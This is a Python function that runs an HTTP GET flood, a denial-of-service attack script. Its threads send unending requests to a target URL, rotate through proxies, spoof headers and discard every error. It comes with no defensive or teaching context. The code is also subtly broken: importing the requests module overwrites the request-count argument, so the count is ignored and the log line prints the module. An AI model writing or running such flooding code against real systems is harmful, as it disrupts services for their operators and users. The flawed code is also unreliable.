def http_get_flood(target, requests, threads, user_agent=None, random_headers=False, proxy_list=None):
    import threading, requests, random

    def flood():
        while True:
            try:
                headers = {}
                if user_agent:
                    headers["User-Agent"] = user_agent
                if random_headers:
                    headers["X-Fake"] = str(random.randint(1000, 9999))
                proxy = {"http": random.choice(proxy_list)} if proxy_list else None
                requests.get(target, headers=headers, proxies=proxy, timeout=3)
            except:
                pass

    print(f"[HTTP] Flooding {target} with {requests} GET requests.")
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
